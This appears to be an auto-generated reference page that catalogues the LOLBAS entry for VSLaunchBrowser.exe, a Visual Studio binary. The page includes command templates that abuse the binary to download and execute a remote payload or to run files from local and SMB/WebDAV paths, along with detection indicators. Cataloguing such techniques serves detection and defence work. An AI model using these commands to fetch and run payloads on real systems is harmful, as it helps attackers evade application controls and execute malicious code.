---
parsed_by: focuslocust
source: lolbas
type: generated
---
# VSLaunchBrowser.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `vslaunchbrowser.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/VsLaunchBrowser.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [VSLaunchBrowser.exe](../../tools/windows/vslaunchbrowser.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | vslaunchbrowser.exe |
| name | VSLaunchBrowser.exe |
| type | tool |
| source | lolbas |
| url |  |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@AvihayEldad'
  Person: Avihay Eldad
Author: Avihay Eldad
Commands:
- Category: Download
  Command: VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
  Description: Download and execute payload from remote server
  MitreID: T1105
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote file to INetCache and open it using the default app associated with the supplied file
    extension with VSLaunchBrowser as parent process.
- Category: Execute
  Command: VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}
  Description: Execute payload via VSLaunchBrowser as parent process
  MitreID: T1127
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser
    as parent process.
- Category: Execute
  Command: VSLaunchBrowser.exe .exe {PATH_SMB}
  Description: Execute payload from WebDAV server via VSLaunchBrowser as parent process
  MitreID: T1127
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: EXE
  - Execute: Remote
  Usecase: It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser
    as parent process.
Created: 2024-04-12
Description: Microsoft Visual Studio browser launcher tool for web applications debugging
Detection:
- IOC: cmd.exe as sub-process of VSLaunchBrowser
- IOC: URL on a VSLaunchBrowser command line
- IOC: VSLaunchBrowser making unexpected network connections or DNS requests
Full_Path:
- Path: C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe
- Path: C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe
Name: VSLaunchBrowser.exe
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/VsLaunchBrowser.yml
```

## Detection / Analysis Notes

```text
IOC: URL on a VSLaunchBrowser command line
```

```text
IOC: VSLaunchBrowser making unexpected network connections or DNS requests
```

```text
IOC: cmd.exe as sub-process of VSLaunchBrowser
```

```text
- IOC: cmd.exe as sub-process of VSLaunchBrowser
- IOC: URL on a VSLaunchBrowser command line
- IOC: VSLaunchBrowser making unexpected network connections or DNS requests
```
